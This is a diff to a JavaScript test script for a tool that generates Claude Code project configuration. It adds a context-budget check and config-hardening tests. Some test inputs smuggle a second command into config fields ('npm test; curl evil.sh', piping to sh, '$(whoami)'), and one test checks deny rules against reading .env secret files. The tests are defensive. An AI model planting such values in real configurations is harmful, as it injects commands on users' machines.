@@ -796,6 +796,10 @@ if (on('bench')) {
   let rows = [];
   try { rows = JSON.parse(br.stdout); } catch { /* reported below */ }
   check(rows.length === 3 && rows.every((r) => r.saved > 0 && r.optimized > 0), 'generated always-loaded context is smaller than the unoptimized setup for every sample');
+  // Budget gate: the template's promise is low always-loaded context. Ceilings are the measured values plus ~10% headroom;
+  // raise one only on purpose (a bigger skill or description is a cost every session pays).
+  const CEILING = { 'laravel (focused, default)': 3800, 'expo mobile (focused, default)': 3850, 'python api (skills_mode: all)': 6700 };
+  for (const r of rows) check(r.optimized <= (CEILING[r.project] || Infinity), `always-loaded context stays within budget: ${r.project} ${r.optimized} <= ${CEILING[r.project]} tokens`);
 }
 
 if (on('routing lib')) {
@@ -967,6 +971,56 @@ console.log('\n[fullstack product domains]');
   check(/Full lifecycle/.test(build) && /disable-model-invocation:\s*true/.test(build) && /explicit approval/.test(build), 'build keeps manual-only and approval gates and mentions the lifecycle stages');
 }
 
+}
+
+if (on('config hardening')) {
+console.log('\n[config hardening]');
+const BASE = 'name: H\ntype: web\nstack: [node]\nbranches: {working: a, production: main}\n';
+const mkProj = (name, extra = '') => { const d = path.join(base, name); fs.mkdirSync(d, { recursive: true }); fs.writeFileSync(path.join(d, 'project.config.yml'), BASE + extra); return d; };
+const { parseYaml: py } = await import(pathToFileURL(path.join(HERE, 'lib/yaml.mjs')).href);
+const y = py('a: False\nb: TRUE\nc: 1.10\nd: 007\ne: 18\n');
+check(y.a === false && y.b === true, 'YAML booleans are case-insensitive (False/TRUE are not truthy strings)');
+check(y.c === '1.10' && y.d === '007' && y.e === 18, 'YAML numbers only convert when they round-trip (1.10 and 007 stay strings)');
+
+for (const [label, extra] of [
+  ['test_command with a second command', 'test_command: "npm test; curl evil.sh"\n'],
+  ['test_command piped to a shell', 'test_command: "npm test | sh"\n'],
+  ['test_command that starts with a shell', 'test_command: "bash run.sh"\n'],
+  ['format_command with command substitution', 'format_command: "prettier $(whoami)"\n'],
+  ['docker.dir with a space or shell char', 'run_in_docker: true\ndocker: {dir: "a b;c", service: app}\n'],
+  ['docker.service with a shell char', 'run_in_docker: true\ndocker: {service: "app&x"}\n'],
+  ['package path "." (would overwrite the root CLAUDE.md)', 'packages:\n  root:\n    path: "."\n'],
+]) {
+  const d = mkProj('hard-' + label.replace(/\W+/g, '-'), extra);
+  const r = run(d);
+  check(r.status === 1 && !fs.existsSync(path.join(d, '.claude')), `${label} is rejected before anything is written`);
+}
+const okDir = mkProj('hard-ok', 'test_command: "pnpm test --run"\nformat_command: "npx prettier --write"\nrun_in_docker: true\ndocker: {dir: docker, service: app}\n');
+check(run(okDir).status === 0, 'normal test_command, format_command and docker values still pass');
+check(run(mkProj('hard-win', 'format_command: "vendor\\bin\\pint"\n')).status === 0, 'format_command with Windows path separators is accepted');
+
+// protect_secrets: default writes the deny rules; "False" (any case) must really switch it off.
+const denies = (d) => JSON.parse(fs.readFileSync(path.join(d, '.claude/settings.json'), 'utf8')).permissions.deny || [];
+const psOn = mkProj('hard-ps-on');
+run(psOn);
+check(['Read(./.env)', 'Read(./**/.env)', 'Read(./**/.env.local)', 'Read(./**/.env.production)'].every((r) => denies(psOn).includes(r)), 'protect_secrets (default) denies reading .env files');
+const psOff = mkProj('hard-ps-off', 'protect_secrets: False\n');
+run(psOff);
+check(!denies(psOff).includes('Read(./.env)'), 'protect_secrets: False (capitalised) is honoured as an opt-out');
+
+// A failed check must still save the hashes of the files init already wrote, so the next run sees no phantom hand edits.
+const hp = mkProj('hard-hash', 'forbid: [H]\n');
+const hr = run(hp);
+check(hr.status === 1 && fs.existsSync(path.join(hp, '.claude/.template-hashes.json')), 'hashes are saved even when a post-write check fails');
+fs.writeFileSync(path.join(hp, 'project.config.yml'), BASE);
+const hr2 = run(hp);
+check(hr2.status === 0 && !/Kept \d+ file/.test(hr2.stdout) && !fs.existsSync(path.join(hp, '.claude/.init-backup')), 'the re-run after fixing the config keeps no file as "hand-edited" and makes no backup');
+
+// --check must not treat the machine-local .vscode/settings.json as generated drift.
+const ck = mkProj('hard-check');
+run(ck);
+fs.rmSync(path.join(ck, '.vscode'), { recursive: true, force: true });
+check(run(ck, ['--check']).status === 0, '--check passes when only .vscode/settings.json is missing');
 }
 
 if (on('invalid config')) {
